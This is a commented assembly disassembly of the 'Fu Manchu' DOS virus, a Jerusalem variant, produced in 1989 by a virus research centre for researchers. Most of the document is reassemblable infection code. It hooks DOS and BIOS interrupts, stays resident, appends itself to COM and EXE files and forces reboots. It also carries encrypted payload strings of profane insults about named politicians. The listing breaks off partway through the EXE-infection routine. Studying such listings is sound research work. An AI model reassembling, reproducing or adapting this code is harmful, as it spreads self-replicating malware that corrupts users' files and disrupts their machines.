	page	65,132
	title	The 'Fu Manchu' Virus
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º                 British Computer Virus Research Centre                   º
; º  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    º
; º  Telephone:     Domestic   0273-26105,   International  +44-273-26105    º
; º                                                                          º
; º                          The 'Fu Manchu' Virus                           º
; º                Disassembled by Joe Hirst,    June    1989                º
; º                                                                          º
; º                      Copyright (c) Joe Hirst 1989.                       º
; º                                                                          º
; º      This listing is only to be made available to virus researchers      º
; º                or software writers on a need-to-know basis.              º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

	; The virus occurs attached to the beginning of a COM file, or the end
	; of an EXE file.  A COM file also has the six-byte 'marker' attached
	; to the end.

	; This virus is a variation of the Jerusalem virus

	; The disassembly has been tested by re-assembly using MASM 5.0.

RAM	SEGMENT AT 0

	; System data

	ORG	3FCH
BW03FC	DW	?
BB03FE	DB	?
	ORG	417H
BB0417	DB	?		; Key states
	ORG	46CH
BB046C	DB	?		; System clock - low byte

	ORG	2CH
ENV_SG	DW	?		; Segment address of environment

RAM	ENDS

RAM40	SEGMENT at 400H

	ORG	1AH
BW041A	DW	?			; Key token in pointer
BW041C	DW	?			; Key token out pointer
	ORG	80H
BW0480	DW	?			; Key token buffer start pointer
BW0482	DW	?			; Key token buffer end pointer

RAM40	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME CS:CODE,DS:NOTHING,ES:RAM

	; Entry point when attached to a COM file

START:	JMP	BP0010

	DB	'sAX'

VR_SIG	DB	'rEMHOr'

VIR_RT	EQU	THIS DWORD
V_RTOF	DW	100H
V_RTSG	DW	323FH

INT_08	EQU	THIS DWORD
I08OFF	DW	0106H			; Int 8 offset
I08SEG	DW	0E95H			; Int 8 segment

INT_09	EQU	THIS DWORD
I09OFF	DW	02E9H			; Int 9 offset
I09SEG	DW	0DC6H			; Int 9 segment

INT_16	EQU	THIS DWORD
I16OFF	DW	0			; Int 16H offset
I16SEG	DW	0			; Int 16H segment

INT_21	EQU	THIS DWORD
I21OFF	DW	138DH			; Int 21H offset
I21SEG	DW	029BH			; Int 21H segment

INT_24	EQU	THIS DWORD
I24OFF	DW	04EBH			; Int 24H offset
I24SEG	DW	3228H			; Int 24H segment

BEGIN	DW	0			; Initial value for AX
F_SIZE	DW	49H			; Total file size
TCOUNT1	DW	0			; Timer count (low)
TCOUNT2	DW	0			; Timer count (high)
ST_ES1	DW	3195H			; Original ES
SET_PA	DW	00A2H

	; Program parameter block

PPB_01	DW	0			; Environment address
PPB_02	DW	0080H			; Command line offset
PPB_03	DW	3195H			; Command line segment
PPB_04	DW	005CH			; FCB1 offset
PPB_05	DW	3195H			; FCB1 segment
PPB_06	DW	006CH			; FCB2 offset
PPB_07	DW	3195H			; FCB2 segment

PRG_SP	DW	0			; Initial stack pointer store
PRG_SS	DW	31A5H			; Initial stack segment store
PROGRM	EQU	THIS DWORD
PRGOFF	DW	0			; Initial code offset store
PRGSEG	DW	31A5H			; Initial code segment store
SS_ST1	DW	0			; Store for system area data (1)
SS_ST2	DB	86H			; Store for system area data (2)

	; .EXE header store

EXEHED	DB	4DH, 5AH		; 00 .EXE header ident
EXHD01	DW	0070H			; 02 Bytes in last page
EXHD02	DW	0006H			; 04 Size of file in pages
EXHD03	DW	0000H			; 06 Number of relocation entries
EXHD04	DW	0020H			; 08 Size of header in paragraphs
EXHD05	DW	0000H			; 0A Minimum extra storage required
EXHD06	DW	-1			; 0C Maximum extra storage required
EXHD07	DW	0005H			; 0E Initial stack segment
EXHD08	DW	ENDADR			; 10 Initial stack pointer
EXHD09	DW	1988H			; 12 Negative checksum
EXHD10	DW	0223H			; 14 Initial code offset
EXHD11	DW	0005H			; 16 Initial code segment
	DW	01EH			; 18 Relative offset of reloc table
	DW	0			; 1A Overlay number

SIGBUF	DB	069H, 06FH, 06EH, 00DH, 00AH, 024H
F_HAND	DW	5			; File handle
F_ATTS	DW	0020H			; File attributes
F_DATE	DW	1273H			; File date
F_TIME	DW	4972H			; File time
F_SIZ1	DW	0250H			; Low-order file size
F_SIZ2	DW	0			; High-order file size
F_PATH	EQU	THIS DWORD
FPTHOF	DW	3D5BH			; Program pathname offset
FPTHSG	DW	9B70H			; Program pathname segment
COM_CM	DB	'COMMAND.COM'
EXE_SW	DB	0			; EXE switch - 0 = .COM extension
MEM_SW	DW	1			; Memory allocated switch
OUT_SW	DB	0			; Output in progress switch
BYTSEC	DW	0200H			; Bytes per sector
PARAGR	DW	0010H			; Size of a paragraph

		; The next fields are encrypted, and translate to:

;STRNG1	DB	'fu manchu virus 3/10/88 - latest in the new fun line!', 0
;STRNG2	DB	'thatcher is a cunt ', 0
;STRNG3	DB	'reagan is an arsehole ', 0
;STRNG4	DB	'botha is a bastard ', 0
;STRNG5	DB	'waldheim is a Nazi ', 0
;STRNG6	DB	'fuck', 8, 8, 8, 8, 0
;STRNG7	DB	'cunt', 8, 8, 8, 8, 0
;STRNG8	DB	'The world will hear from me again!   ', 0

STRNG1	DB	0C9H, 0DAH, 08FH, 0C2H, 0CEH, 0C1H, 0CCH, 0C7H
	DB	0DAH, 08FH, 0D9H, 0C6H, 0DDH, 0DAH, 0DCH, 08FH
	DB	09CH, 080H, 09EH, 09FH, 080H, 097H, 097H, 08FH
	DB	082H, 08FH, 0C3H, 0CEH, 0DBH, 0CAH, 0DCH, 0DBH
	DB	08FH, 0C6H, 0C1H, 08FH, 0DBH, 0C7H, 0CAH, 08FH
	DB	0C1H, 0CAH, 0D8H, 08FH, 0C9H, 0DAH, 0C1H, 08FH
	DB	0C3H, 0C6H, 0C1H, 0CAH, 08EH, 0
STRNG2	DB	0DBH, 0C7H, 0CEH, 0DBH, 0CCH, 0C7H, 0CAH, 0DDH
	DB	08FH, 0C6H, 0DCH, 08FH, 0CEH, 08FH, 0CCH, 0DAH
	DB	0C1H, 0DBH, 08FH, 0
STRNG3	DB	0DDH, 0CAH, 0CEH, 0C8H, 0CEH, 0C1H, 08FH, 0C6H
	DB	0DCH, 08FH, 0CEH, 0C1H, 08FH, 0CEH, 0DDH, 0DCH
	DB	0CAH, 0C7H, 0C0H, 0C3H, 0CAH, 08FH, 0
STRNG4	DB	0CDH, 0C0H, 0DBH, 0C7H, 0CEH, 08FH, 0C6H, 0DCH
	DB	08FH, 0CEH, 08FH, 0CDH, 0CEH, 0DCH, 0DBH, 0CEH
	DB	0DDH, 0CBH, 08FH, 0
STRNG5	DB	0D8H, 0CEH, 0C3H, 0CBH, 0C7H, 0CAH, 0C6H, 0C2H
	DB	08FH, 0C6H, 0DCH, 08FH, 0CEH, 08FH, 0E1H, 0CEH
	DB	0D5H, 0C6H, 08FH, 0
STRNG6	DB	0C9H, 0DAH, 0CCH, 0C4H, 0A7H, 0A7H, 0A7H, 0A7H, 0
STRNG7	DB	0CCH, 0DAH, 0C1H, 0DBH, 0A7H, 0A7H, 0A7H, 0A7H, 0
STRNG8	DB	0FBH, 0C7H, 0CAH, 08FH, 0D8H, 0C0H, 0DDH, 0C3H
	DB	0CBH, 08FH, 0D8H, 0C6H, 0C3H, 0C3H, 08FH, 0C7H
	DB	0CAH, 0CEH, 0DDH, 08FH, 0C9H, 0DDH, 0C0H, 0C2H
	DB	08FH, 0C2H, 0CAH, 08FH, 0CEH, 0C8H, 0CEH, 0C6H
	DB	0C1H, 08EH, 08FH, 08FH, 08FH, 0

		; Each entry is:
		;			DB	length to find
		;			DB	length found
		;			DW	pointer to string

TABLE	DB	10, 0
	DW	STRNG1
	DB	9, 0
	DW	STRNG2
	DB	7, 0
	DW	STRNG3
	DB	6, 0
	DW	STRNG4
	DB	9, 0
	DW	STRNG5
	DB	4, 0
	DW	STRNG6
	DB	4, 0
	DW	STRNG7
	DB	0
TABOUT	DW	0			; Table entry for output

	; Key number table for fake input

KEYTAB	DB	03H, 1EH, 30H, 2EH, 20H, 12H, 21H, 22H	; 00 - 07
	DB	0EH, 0FH, 1CH, 25H, 26H, 1CH, 31H, 18H	; 08 - 0F
	DB	19H, 10H, 13H, 1FH, 14H, 16H, 2FH, 11H	; 10 - 17
	DB	2DH, 15H, 2CH, 01H, 2BH, 1BH, 07H, 0CH	; 18 - 1F
	DB	39H, 02H, 28H, 04H, 05H, 06H, 08H, 28H	; 20 - 27
	DB	0AH, 0BH, 09H, 0DH, 33H, 0CH, 34H, 35H	; 28 - 2F
	DB	0BH, 02H, 03H, 04H, 05H, 06H, 07H, 08H	; 30 - 37
	DB	09H, 0AH, 27H, 27H, 33H, 0DH, 34H, 35H	; 38 - 3F
	DB	03H, 1EH, 30H, 2EH, 20H, 12H, 21H, 22H	; 40 - 47
	DB	23H, 17H, 24H, 25H, 26H, 32H, 31H, 18H	; 48 - 4F
	DB	19H, 10H, 13H, 1FH, 14H, 16H, 2FH, 11H	; 50 - 57
	DB	2DH, 15H, 2CH, 1AH, 2BH, 1BH, 07H, 0CH	; 58 - 5F
	DB	29H, 1EH, 30H, 2EH, 20H, 12H, 21H, 22H	; 60 - 67
	DB	23H, 17H, 24H, 25H, 26H, 32H, 31H, 18H	; 68 - 6F
	DB	19H, 10H, 13H, 1FH, 14H, 16H, 2FH, 11H	; 70 - 77
	DB	2DH, 15H, 2CH, 1AH, 2BH, 1BH, 29H, 0EH	; 78 - 7F

	; This section assumes a COM origin of 100H


BP0010:	CLD
	MOV	AH,0E1H			; Virus "are you there" call
	INT	21H			; DOS service (Virus - 1)
	CMP	AH,0E1H			; Test for unchanged
	JNB	BP0020			; Branch if invalid reply
	CMP	AH,4			; Test for standard "yes"
	JB	BP0020			; Branch if non-standard
	MOV	AH,0DDH			; Replace program over virus
	MOV	DI,0100H		; Initial offset
	MOV	SI,OFFSET ENDADR	; Length of virus
	ADD	SI,DI			; Add initial offset
	MOV	CX,F_SIZE[DI]		; Get total filesize
	INT	21H			; DOS service (Virus - 2)

	; Virus not in system, or non-communicating variety

BP0020:	MOV	AX,CS			; Get current segment
	ADD	AX,10H			; Address past PSP
	MOV	PRG_SP,SP		; Save current value
	MOV	SS,AX			; \ Set up stack
	MOV	SP,OFFSET ENDADR+100H	; /
	PUSH	AX			; Segment for return
	MOV	AX,OFFSET BP0030	; \ Offset for return
	PUSH	AX			; /
	RETF				; "Return" to next instruction

	; We now have an origin of zero
	; Entry point when attached to an EXE file

BP0030:	CLD
	PUSH	ES
	MOV	ST_ES1,ES		; Save original ES
	MOV	PPB_03,ES		; \
	MOV	PPB_05,ES		;  ) Segments in PPB
	MOV	PPB_07,ES		; /
	MOV	AX,ES			; \ Segment relocation factor
	ADD	AX,10H			; /
	ADD	PRGSEG,AX		; Initial code segment store
	ADD	PRG_SS,AX		; Initial stack segment store
	MOV	AH,0E1H			; Virus "are you there" call
	INT	21H			; DOS service (Virus - 1)
	CMP	AH,0E1H			; Test for unchanged
	JNB	BP0040			; Branch if not
	CMP	AH,4			; Test for standard "yes"
	POP	ES
	MOV	SS,PRG_SS		; Initial stack segment store
	MOV	SP,PRG_SP		; Initial stack pointer store
	JMP	PROGRM			; Start of actual program

	; Virus is not already active

BP0040:	XOR	AX,AX			; \ Address page zero
	MOV	ES,AX			; /
	MOV	AX,BW03FC		; \ Save system area data (1)
	MOV	SS_ST1,AX		; /
	MOV	AL,BB03FE		; \ Save system area data (2)
	MOV	SS_ST2,AL		; /
	MOV	BW03FC,0A4F3H		; Store   REPZ  MOVSB
	MOV	BB03FE,0CBH		; Store   RETF
	POP	AX			; \
	ADD	AX,10H			;  ) Address past PSP
	MOV	ES,AX			; /
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	CX,OFFSET ENDADR	; Length of virus
	XOR	SI,SI			; \ Clear registers
	MOV	DI,SI			; /
	PUSH	ES			; \
	MOV	AX,OFFSET BP0050	;  ) Set up return address
	PUSH	AX			; /
	DB	0EAH			; \ Far jump to move instruction
	DW	BW03FC, 0		; /

BP0050:	MOV	AX,CS			; \
	MOV	SS,AX			;  ) Set up internal stack
	MOV	SP,OFFSET ENDADR+100H	; /
	XOR	AX,AX			; \ Address page zero
	MOV	DS,AX			; /
	ASSUME	DS:RAM,ES:NOTHING
	MOV	AX,SS_ST1		; \ Restore system area data (1)
	MOV	BW03FC,AX		; /
	MOV	AL,SS_ST2		; \ Restore system area data (2)
	MOV	BB03FE,AL		; /
	MOV	BX,SP			; Get stack pointer
	MOV	CL,4			; \ Convert to paragraphs
	SHR	BX,CL			; /
	ADD	BX,10H			; Allow for PSP
	MOV	SET_PA,BX		; Save number of paragraphs
	MOV	ES,ST_ES1		; Get original ES
	MOV	AH,4AH			; Set block
	INT	21H			; DOS service (Set block)
	MOV	AX,3521H		; Get interrupt 21H
	INT	21H			; DOS service (Get int)
	MOV	I21OFF,BX		; Save interrupt 21H offset
	MOV	I21SEG,ES		; Save interrupt 21H segment
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	ASSUME	DS:CODE
	MOV	DX,OFFSET BP0170	; Interrupt 21H routine
	MOV	AX,2521H		; Set interrupt 21H
	INT	21H			; DOS service (Set int)
	MOV	ES,ST_ES1		; Get original ES
	ASSUME	ES:RAM
	MOV	ES,ES:ENV_SG		; Get environment segment
	XOR	DI,DI			; Start of environment
	MOV	CX,7FFFH		; Allow for 32K environment
	XOR	AL,AL			; Search for zero
BP0060:	REPNZ	SCASB			; Find zero
	CMP	ES:[DI],AL		; Is following character zero
	LOOPNZ	BP0060			; Search again if not
	MOV	DX,DI			; Save pointer
	ADD	DX,3			; Address pathname
	MOV	AX,4B00H		; Load and execute program
	PUSH	ES			; \ Set DS to ES
	POP	DS			; /
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	ASSUME	DS:RAM,ES:NOTHING
	MOV	BX,OFFSET PPB_01	; PPB (for load and execute)
	PUSH	DS
	PUSH	ES
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	ASSUME	DS:CODE

		; Install interrupt 9 routine

	MOV	AX,3509H		; Get interrupt 9
	INT	21H			; DOS service (Get int)
	MOV	I09OFF,BX		; Save interrupt 9 offset
	MOV	I09SEG,ES		; Save interrupt 9 segment
	MOV	AX,2509H		; Set interrupt 9
	MOV	DX,OFFSET BP0150	; Interrupt 9 routine
	INT	21H			; DOS service (Set int)

	MOV	AH,2AH			; Get date
	INT	21H			; DOS service (Get date)
	CMP	CX,07C5H		; Year = 1989
	JL	BP0070			; Branch if before
	CMP	DH,8			; Month = August
	JL	BP0070			; Branch if before

		; Install interrupt 16H routine

	MOV	OUT_SW,0		; Set off output switch
	MOV	AX,3516H		; Get interrupt 16H
	INT	21H			; DOS service (Get int)
	MOV	I16OFF,BX		; Save interrupt 16H offset
	MOV	I16SEG,ES		; Save interrupt 16H segment
	MOV	AX,2516H		; Set interrupt 16H
	MOV	DX,OFFSET BP0540	; Interrupt 16H routine
	INT	21H			; DOS service (Set int)

BP0070:	MOV	BL,BB046C		; Get low byte of system clock
	MOV	BH,BL			; Copy
	AND	BX,0F00FH		; Isolate nibbles
	CMP	BL,0			; Is low nibble of clock zero?
	JNE	BP0080			; Branch if not
	MOV	CL,4			; Bits to move
	SHR	BH,CL			; Move top nibble to bottom
	CMP	BH,0			; Is second nibble of clock zero?
	JE	BP0080			; Branch if yes
	XOR	AX,AX			; Clear register
	MOV	TCOUNT1,AX		; Set timer count (low)
	MOV	AL,BH			; Get second nibble of system clock
	MOV	TCOUNT2,AX		; Set timer count (high)

		; Install interrupt 8 routine

	MOV	AX,3508H		; Get interrupt 8
	INT	21H			; DOS service (Get int)
	MOV	I08OFF,BX		; Save interrupt 8 offset
	MOV	I08SEG,ES		; Save interrupt 8 segment
	MOV	AX,2508H		; Set interrupt 8
	MOV	DX,OFFSET BP0100	; Interrupt 8 routine
	INT	21H			; DOS service (Set int)

BP0080:	POP	DX
	POP	CX
	POP	BX
	POP	AX
	POP	ES
	POP	DS
	ASSUME	DS:NOTHING
	PUSHF				; Fake an interrupt
	CALL	INT_21			; Interrupt 21H (Load and execute)
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	MOV	AH,49H			; Free allocated memory
	INT	21H			; DOS service (Free memory)
	MOV	AH,4DH			; Get return code of child process
	INT	21H			; DOS service (Get return code)
	MOV	AH,31H			; Keep process
	MOV	DX,OFFSET ENDADR	; Length of program
	MOV	CL,4			; \ Convert to paragraphs
	SHR	DX,CL			; /
	ADD	DX,10H			; Add length of PSP
	INT	21H			; DOS service (Keep process)

	; Interrupt 24H

BP0090:	XOR	AL,AL			; Ignore the error
	IRET

	; Interrupt 8

BP0100:	SUB	TCOUNT1,1		; \ Subtract from timer count
	SBB	TCOUNT2,0		; /
	JNZ	BP0140			; Branch if not zero
	CMP	TCOUNT1,0		; Is low count zero?
	JNZ	BP0140			; Branch if not
BP0110:	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	AX,3			; Mode three
	INT	10H			; VDU I/O
	MOV	AH,2			; Move cursor
	MOV	BH,0			; Page zero
	MOV	DX,0A14H		; Row ten column twenty
	INT	10H			; VDU I/O
	MOV	SI,OFFSET STRNG8	; Address message
BP0120:	LOOP	BP0120			; Delay between characters
	LODSB				; Get a character
	CMP	AL,0			; Is that the end?
	JE	BP0130			; Branch if yes
	XOR	AL,0AFH			; Decrypt character
	MOV	AH,14			; Write in TTY mode
	INT	10H			; VDU I/O
	JMP	BP0120			; Next character
	
BP0130:	DB	0EAH			; Far jump to BIOS initialisation
	DW	0FFF0H, 0F000H

BP0140:	JMP	INT_08			; Interrupt 8

	; Interrupt 9

	ASSUME	DS:RAM
BP0150:	PUSH	AX
	PUSH	BX
	PUSH	DS
	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	IN	AL,60H			; Get keyboard token
	MOV	BL,BB0417		; Get key states
	TEST	BL,8			; Alt key depressed?
	JZ	BP0160			; Branch if not
	TEST	BL,4			; Ctrl key depressed?
	JZ	BP0160			; Branch if not
	CMP	AL,53H			; Del character token?
	JNE	BP0160			; Branch if not
	AND	BL,0F3H			; Set off Alt & Ctrl states
	MOV	BB0417,BL		; Replace key states
	IN	AL,61H			; Get Port B
	MOV	AH,AL			; Save value
	OR	AL,80H			; Set on keyboard reset bit
	OUT	61H,AL			; Output port B
	XCHG	AL,AH			; Recover original Port B value
	OUT	61H,AL			; Output port B
	JMP	BP0110			; Message and reboot

BP0160:	POP	DS
	POP	BX
	POP	AX
	JMP	INT_09			; Interrupt 9

	; Interrupt 21H

BP0170:	PUSHF
	CMP	AH,0E1H			; Virus "are you there" call
	JNE	BP0180			; Branch if other call
	MOV	AX,0400H		; Standard "yes"
	POPF
	IRET

BP0180:	CMP	AH,0DDH			; Virus move and execute COM call
	JE	BP0200			; Branch if yes
	CMP	AX,4B00H		; Is it load and execute
	JNE	BP0190			; Branch if not
	JMP	BP0210			; Process load and execute

BP0190:	POPF
	JMP	INT_21			; Interrupt 21H

	; Move program down and execute (COM only) call

	ASSUME	DS:NOTHING
BP0200:	POP	AX
	POP	AX			; Retrieve return offset
	MOV	AX,100H			; Replace with start address
	MOV	V_RTOF,AX		; Store in return jump
	POP	AX			; Retrieve return segment
	MOV	V_RTSG,AX		; Store in return jump
	REPZ	MOVSB			; Restore program to beginning
	POPF
	MOV	AX,BEGIN		; Start with zero register
	JMP	VIR_RT			; Start actual program

	; Process load and execute program

BP0210:	MOV	F_HAND,-1		; No file handle
	MOV	MEM_SW,0		; Set off memory allocated switch
	MOV	FPTHOF,DX		; Save pathname offset
	MOV	FPTHSG,DS		; Save pathname segment
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	PUSH	DI
	PUSH	DS
	PUSH	ES
	CLD
	MOV	DI,DX			; Point to file pathname
	XOR	DL,DL			; Default drive
	CMP	BYTE PTR [DI+1],3AH	; Test second character for ':'
	JNE	BP0220			; Branch if not
	MOV	DL,[DI]			; Get drive letter
	AND	DL,1FH			; Convert to number
BP0220:	MOV	AH,36H			; Get disk free space
	INT	21H			; DOS service (Get disk free)
	CMP	AX,-1			; Test for invalid drive
	JNE	BP0240			; Branch if not
BP0230:	JMP	BP0530			; Terminate

BP0240:	MUL	BX			; Calc number of free sectors
	MUL	CX			; Calc number of free bytes
	OR	DX,DX			; Test high word of result
	JNZ	BP0250			; Branch if not zero
	CMP	AX,OFFSET ENDADR	; Length of virus
	JB	BP0230			; Terminate if less
BP0250:	MOV	DX,FPTHOF		; Get pathname offset
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	XOR	AL,AL			; Test character - zero
	MOV	CX,41H			; Maximum pathname length
	REPNZ	SCASB			; Find end of pathname
	MOV	SI,FPTHOF		; Get pathname offset
BP0260:	MOV	AL,[SI]			; Get pathname character
	OR	AL,AL			; Test for a character
	JZ	BP0280			; Finish if none
	CMP	AL,61H			; Test for 'a'
	JB	BP0270			; Branch if less
	CMP	AL,7AH			; Test for 'z'
	JA	BP0270			; Branch if above
	SUB	BYTE PTR [SI],20H	; Convert to uppercase
BP0270:	INC	SI			; Address next character
	JMP	BP0260			; Process next character

BP0280:	MOV	CX,0BH			; Load length 11
	SUB	SI,CX			; Address back by length
	MOV	DI,OFFSET COM_CM	; 'COMMAND.COM'
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	MOV	CX,0BH			; Load length again
	REPZ	CMPSB			; Compare
	JNE	BP0290			; Continue if not command.com
	JMP	BP0530			; Terminate

BP0290:	MOV	AX,4300H		; Get file attributes
	INT	21H			; DOS service (Get attributes)
	JB	BP0300			; Follow chain of error branches
	MOV	F_ATTS,CX		; Save file attributes
BP0300:	JB	BP0320			; Follow chain of error branches
	XOR	AL,AL			; Scan character - zero
	MOV	EXE_SW,AL		; Set EXE switch off
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	MOV	DI,DX			; Pointer to pathname
	MOV	CX,41H			; Maximum pathname length
	REPNZ	SCASB			; Find end of pathname
	CMP	BYTE PTR [DI-2],4DH	; Is last letter 'M'
	JE	BP0310			; Branch if yes
	CMP	BYTE PTR [DI-2],6DH	; Is last letter 'm'
	JE	BP0310			; Branch if yes
	INC	EXE_SW			; Set EXE switch on
BP0310:	MOV	AX,3D00H		; Open handle, read only
	INT	21H			; DOS service (Open handle)
BP0320:	JB	BP0330			; Follow chain of error branches
	MOV	F_HAND,AX		; Save file handle
	MOV	BX,AX			; File handle
	CMP	EXE_SW,0		; Test EXE switch
	JE	BP0340			; Branch if off

	; Test EXE file for infection

	MOV	CX,1CH			; Length of EXE header
	MOV	DX,OFFSET EXEHED	; .EXE header store
	MOV	AX,CS			; \
	MOV	DS,AX			;  ) Make DS & ES same as CS
	MOV	ES,AX			; /
	ASSUME	DS:CODE
	MOV	AH,3FH			; Read handle
	INT	21H			; DOS service (Read handle)
BP0330:	JB	BP0370			; Follow chain of error branches
	CMP	EXHD09,1988H		; Negative checksum
	JNE	BP0360			; Branch if not infected
	JMP	BP0350			; Dont infect

	ASSUME	DS:NOTHING
BP0340:	MOV	AX,4202H		; Move file pointer
	MOV	CX,-1			; \ End of file minus 6
	MOV	DX,-6			; /
	INT	21H			; DOS service (Move pointer)
	JB	BP0320			; Follow chain of error branches
	ADD	AX,6			; Total file size
	MOV	F_SIZE,AX		; Save total file size
	MOV	CX,6			; Length to read
	MOV	DX,OFFSET SIGBUF	; Infection test buffer
	MOV	AX,CS			; \
	MOV	DS,AX			;  ) Make DS & ES same as CS
	MOV	ES,AX			; /
	ASSUME	DS:CODE
	MOV	AH,3FH			; Read handle
	INT	21H			; DOS service (Read handle)
	MOV	DI,DX			; Address test buffer
	MOV	SI,OFFSET VR_SIG	; Signature
	REPZ	CMPSB			; Compare signatures
	JNE	BP0360			; Branch if not infected
BP0350:	MOV	AH,3EH			; Close handle
	INT	21H			; DOS service (Close handle)
	JMP	BP0530			; Terminate

BP0360:	MOV	AX,3524H		; Get interrupt 24H
	INT	21H			; DOS service (Get int)
	MOV	I24OFF,BX		; Save interrupt 24H offset
	MOV	I24SEG,ES		; Save interrupt 24H segment
	MOV	DX,OFFSET BP0090	; Interrupt 24H routine
	MOV	AX,2524H		; Set interrupt 24H
	INT	21H			; DOS service (Set int)
	LDS	DX,F_PATH		; Address program pathname
	XOR	CX,CX			; No attributes
	MOV	AX,4301H		; Set file attributes
	INT	21H			; DOS service (Set attributes)
	ASSUME	DS:NOTHING
BP0370:	JB	BP0380			; Follow chain of error branches
	MOV	BX,F_HAND		; Get file handle
	MOV	AH,3EH			; Close handle
	INT	21H			; DOS service (Close handle)
	MOV	F_HAND,-1		; No file handle
	MOV	AX,3D02H		; Open handle read/write
	INT	21H			; DOS service (Open handle)
	JB	BP0380			; Follow chain of error branches
	MOV	F_HAND,AX		; Save file handle
	MOV	AX,CS			; \
	MOV	DS,AX			;  ) Make DS & ES same as CS
	MOV	ES,AX			; /
	ASSUME	DS:CODE
	MOV	BX,F_HAND		; Get file handle
	MOV	AX,5700H		; Get file date and time
	INT	21H			; DOS service (Get file date)
	MOV	F_DATE,DX		; Save file date
	MOV	F_TIME,CX		; Save file time
	MOV	AX,4200H		; Move file pointer
	XOR	CX,CX			; \ Beginning of file
	MOV	DX,CX			; /
	INT	21H			; DOS service (Move pointer)
BP0380:	JB	BP0410			; Follow chain of error branches
	CMP	EXE_SW,0		; Test EXE switch
	JE	BP0390			; Branch if off
	JMP	BP0430			; Process EXE file

	; .COM file processing

BP0390:	MOV	BX,1000H		; 64K of memory wanted
	MOV	AH,48H			; Allocate memory
	INT	21H			; DOS service (Allocate memory)
	JNB	BP0400			; Branch if successful
	MOV	AH,3EH			; Close handle
	MOV	BX,F_HAND		; Get file handle
	INT	21H			; DOS service (Close handle)
	JMP	BP0530			; Terminate

BP0400:	INC	MEM_SW			; Set on memory allocated switch
	MOV	ES,AX			; Segment of allocated memory
	XOR	SI,SI			; Start of virus
	MOV	DI,SI			; Start of allocated memory
	MOV	CX,OFFSET ENDADR	; Length of virus
	REPZ	MOVSB			; Copy virus to allocated
	MOV	DX,DI			; Address after virus
	MOV	CX,F_SIZE		; Total file size
	MOV	BX,F_HAND		; Get file handle
	PUSH	ES			; \ Set DS to ES
	POP	DS			; /
	MOV	AH,3FH			; Read handle
	INT	21H			; DOS service (Read handle)
BP0410:	JB	BP0420			; Follow chain of error branches
	ADD	DI,CX			; Add previous file size
	XOR	CX,CX			; \ Beginning of file
	MOV	DX,CX			; /
	MOV	AX,4200H		; Move file pointer
	INT	21H			; DOS service (Move pointer)
	MOV	SI,OFFSET VR_SIG	; Signature
	MOV	CX,6			; Length to move
	REPZ	MOVS	[DI],CS:VR_SIG	; Copy signature to end
	MOV	CX,DI			; Length to write
	XOR	DX,DX			; Start of allocated
	MOV	AH,40H			; Write handle
	INT	21H			; DOS service (Write handle)
BP0420:	JB	BP0440			; Follow chain of error branches
	JMP	BP0510			; Free memory and reset values

	; .EXE file processing

BP0430:	MOV	CX,1CH			; Length of EXE header
	MOV	DX,OFFSET EXEHED	; .EXE header store
	MOV	AH,3FH			; Read handle
	INT	21H			; DOS service (Read handle)
BP0440:	JB	BP0460			; Follow chain of error branches
	MOV	EXHD09,1988H		; Negative checksum
	MOV	AX,EXHD07		; \ Store initial stack segment
	MOV	PRG_SS,AX		; /
	MOV	AX,EXHD08		; \ Store initial stack pointer
	MOV	PRG_SP,AX		; /
	MOV	AX,EXHD10		; \ Store initial code offset
	MOV	PRGOFF,AX		; /
	MOV	AX,EXHD11		; \ Store initial code segment
	MOV	PRGSEG,AX		; /
	MOV	AX,EXHD02		; Get size of file in pages
	CMP	EXHD01,0		; Number of bytes in last page
	JE	BP0450			; Branch if none
	DEC	AX			; One less page
BP0450:	MUL	BYTSEC			; Bytes per sector
	ADD	AX,EXHD01		; \ Add bytes in last page
	ADC	DX,0			; /
	ADD	AX,0FH			; \ Round up
	ADC	DX,0			; /
	AND	AX,0FFF0H		; Clear bottom figure
	MOV	F_SIZ1,AX		; Save low-order file size
	MOV	F_SIZ2,DX		; Save high-order file size
	ADD	AX,OFFSET ENDADR	; \ Add virus length
	ADC	DX,0			; /
BP0460:	JB	BP0480			; Follow chain of error branches
	DIV	BYTSEC			; Bytes per sector
	OR	DX,DX			; Test odd bytes
	JZ	BP0470			; Branch if none
	INC	AX			; One more page for odd bytes
BP0470:	MOV	EXHD02,AX		; Store size of file in pages
	MOV	EXHD01,DX		; Store bytes in last page
	MOV	AX,F_SIZ1		; Low-order file size
	MOV	DX,F_SIZ2		; High-order file size
	DIV	PARAGR			; Size of a paragraph
	SUB	AX,EXHD04		; Size of header in paragraphs
	MOV	EXHD11,AX		; Initial code segment
	MOV	EXHD10,OFFSET BP0030	; Initial code offset
	MOV	EXHD07,AX		; Initial stack segment
	MOV	EXHD08,OFFSET ENDADR	; Initial stack pointer
	XOR	CX,CX			; \ Beginning of file
	MOV	DX,CX			; /
	MOV	AX,4200H		; Move file pointer
	INT	21H			; DOS service (Move pointer)
BP0480:	JB	BP0490			; Follow chain of error branches
	MOV	CX,1CH			; Length of EXE header
	MOV	DX,OFFSET EXEHED	; .EXE header store
	MOV	AH,40H			; Write handle
	INT	21H			; DOS service (Write handle)
BP0490:	JB	BP0500			; Follow chain of error branches
	CMP	AX,CX			; Has same length been written
